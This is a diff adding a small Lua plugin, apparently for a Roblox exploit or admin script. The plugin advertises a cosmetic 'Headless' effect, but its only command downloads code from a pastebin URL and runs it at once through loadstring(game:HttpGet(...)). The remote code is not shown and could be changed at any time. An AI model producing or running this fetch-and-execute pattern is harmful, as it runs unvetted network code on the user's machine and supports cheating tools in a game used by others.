@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "Headless",
+	["PluginDescription"] = " Be Headless ",
+	["Commands"] = {
+		["buildaboatfortreasure"] = {
+			["Description"] = "oh no! Wheres my head?!",
+			["Aliases"] = {'removehead', 'nohead', 'headless'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet(('https://pastebin.com/raw/gyZ4pv5i'),true))()
+			end,
+		},
+	},
+}
+
+return Plugin
